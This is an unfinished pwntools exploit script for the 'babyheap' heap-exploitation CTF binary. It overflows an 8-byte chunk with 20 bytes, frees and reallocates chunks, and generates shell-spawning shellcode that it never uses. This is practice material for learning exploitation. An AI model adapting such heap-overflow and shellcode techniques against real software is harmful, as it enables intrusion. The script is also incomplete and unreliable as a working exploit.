#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyheap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./babyheap')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

index1 = 0
index2 = 1
size1 = 8
size2 = 10
payload1 = "AAAAAAAAAAAAAAAAAAAA"
payload2 = "BBBBBBBBBB"


io = start()

def allocate(size):
    print("allocating...")
    io.recvuntil("Command: ")
    print("sending command int...")
    io.sendline("1")
    io.recvuntil("Size:")
    print("sending size str")
    io.sendline(str(size))
    result = io.recvline()
    index = int(result.split(" ")[3])
    return index

def fill(index, size, content):
    io.recvuntil("Command: ")
    print("choosing Fill")
    io.sendline("2")
    io.recvuntil("Index:")
    print("setting index...")
    io.sendline(str(index))
    io.recvuntil("Size:")
    print("setting Size...")
    io.sendline(str(size))
    io.recvuntil("Content:")
    print("sending Content...")
    io.sendline(content)


def free(index): 
    io.recvuntil("Command:")
    print("choosing Free...")
    io.sendline("3")
    io.recvuntil("Index:")
    print("setting index...")
    io.sendline(str(index))

index1 = allocate(8)
print("allocated index is {}".format(index1))

fill(index1, size1, payload1)
free(index1)

index2 = allocate(10)
print("allocated index is {}".format(index2))

fill(index2, size2, payload2)

shellcode = asm(shellcraft.sh())
print(shellcode)
# 2. Fill
# 4. Dump
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

